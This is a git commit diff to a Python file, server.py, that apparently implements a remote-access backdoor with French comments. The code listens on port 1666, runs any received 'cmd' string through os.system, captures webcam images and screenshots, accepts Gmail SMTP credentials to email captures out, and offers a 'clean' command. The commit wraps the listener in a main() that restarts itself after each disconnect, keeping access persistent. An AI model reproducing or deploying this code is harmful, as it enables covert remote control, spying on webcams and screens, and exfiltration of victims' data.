6dc291fb51a44247384c22f4ef09504744fdf89d
Eidknab <42701747+Eidknab@users.noreply.github.com>
2018-08-30 22:32:03 +0200

    Add files via upload

--- server.py
+++ server.py
@@ -16,6 +16,9 @@ mailpw = ""
 smtpadr = "smtp.gmail.com"
 smtpport = 587
 
+hote = ""
+port = 1666
+
 def rcvscr():
 	try:
 		print(mail, mailpw, smtpadr, smtpport) 
@@ -104,66 +107,60 @@ def camshot():
 		retval, frame = cam.read()
 		cv2.imwrite('cam.png', frame)
 		cv2.imshow("cam", frame)
-		cv2.waitKey()
 		cv2.destroyAllWindows()
 		print("camshot... done !")
 	except:
 		print("camshot... error !")
 
-hote = ''
-port = 1666
+def main():
+	connexion_principale = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	connexion_principale.bind((hote, port))
+	connexion_principale.listen(5)
 
-connexion_principale = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-connexion_principale.bind((hote, port))
-connexion_principale.listen(5)
+	print("Le serveur écoute à présent sur le port {}".format(port))
 
-print("Le serveur écoute à présent sur le port {}".format(port))
-
-connexion_avec_client, infos_connexion = connexion_principale.accept()
-msg_recu = b""
-i = 0 
-while i < 1:
-	msg_recu = connexion_avec_client.recv(1024)
-# L'instruction ci-dessous peut lever une exception si le message
-# Réceptionné comporte des accents
-	print(msg_recu.decode())
-	connexion_avec_client.send(b"ok")
-	if msg_recu == b"quit":
-		print("Fermeture de la connexion")
-		i = i + 1
-	elif msg_recu[0:3] == b"cmd":
-		print(msg_recu.decode()[4:len(msg_recu)])
-		os.system(msg_recu.decode()[4:len(msg_recu)])
-	elif msg_recu[0:5] == b"mail ":
-		mail = msg_recu.decode()[5:len(msg_recu)]
-		os.system("cls")
-	elif msg_recu[0:7] == b"mailpw ":
-		mailpw = msg_recu.decode()[7:len(msg_recu)]
-		print(mailpw)
-		os.system("cls")
-	elif msg_recu[0:8] == b"smtpadr ":
-		smtpadr = msg_recu.decode()[8:len(msg_recu)]
-		os.system("cls")
-	elif msg_recu[0:9] == b"smtpport ":
-		try:
-			smtpport = int(msg_recu.decode()[9:len(msg_recu)])
-		except:
-			pass
-		os.system("cls")
-	elif msg_recu == b"rcv":
-		rcvscr()
-		rcvcam()
-	elif msg_recu == b"clean":
-		cleanall()
-	elif msg_recu == b"scr":
-		scr()
-	elif msg_recu == b"camshot":
-		camshot()
-
-
-
-
-print("Fermeture de la connexion")
-
-connexion_avec_client.close()
-connexion_principale.close()
+	connexion_avec_client, infos_connexion = connexion_principale.accept()
+	print("Connecté sur le serveur")
+	msg_recu = b""
+	i = 0 
+	while i < 1:
+		msg_recu = connexion_avec_client.recv(1024)
+	# L'instruction ci-dessous peut lever une exception si le message
+	# Réceptionné comporte des accents
+		print(msg_recu.decode())
+		connexion_avec_client.send(b"ok")
+		if msg_recu == b"quit":
+			print("Fermeture de la connexion")
+			i = i + 1
+		elif msg_recu[0:3] == b"cmd":
+			print(msg_recu.decode()[4:len(msg_recu)])
+			os.system(msg_recu.decode()[4:len(msg_recu)])
+		elif msg_recu[0:5] == b"mail ":
+			mail = msg_recu.decode()[5:len(msg_recu)]
+			os.system("cls")
+		elif msg_recu[0:7] == b"mailpw ":
+			mailpw = msg_recu.decode()[7:len(msg_recu)]
+			print(mailpw)
+			os.system("cls")
+		elif msg_recu[0:8] == b"smtpadr ":
+			smtpadr = msg_recu.decode()[8:len(msg_recu)]
+			os.system("cls")
+		elif msg_recu[0:9] == b"smtpport ":
+			try:
+				smtpport = int(msg_recu.decode()[9:len(msg_recu)])
+			except:
+				pass
+			os.system("cls")
+		elif msg_recu == b"rcv":
+			rcvscr()
+			rcvcam()
+		elif msg_recu == b"clean":
+			cleanall()
+		elif msg_recu == b"scr":
+			scr()
+		elif msg_recu == b"camshot":
+			camshot()
+	connexion_avec_client.close()
+	connexion_principale.close()
+	main()
+main()
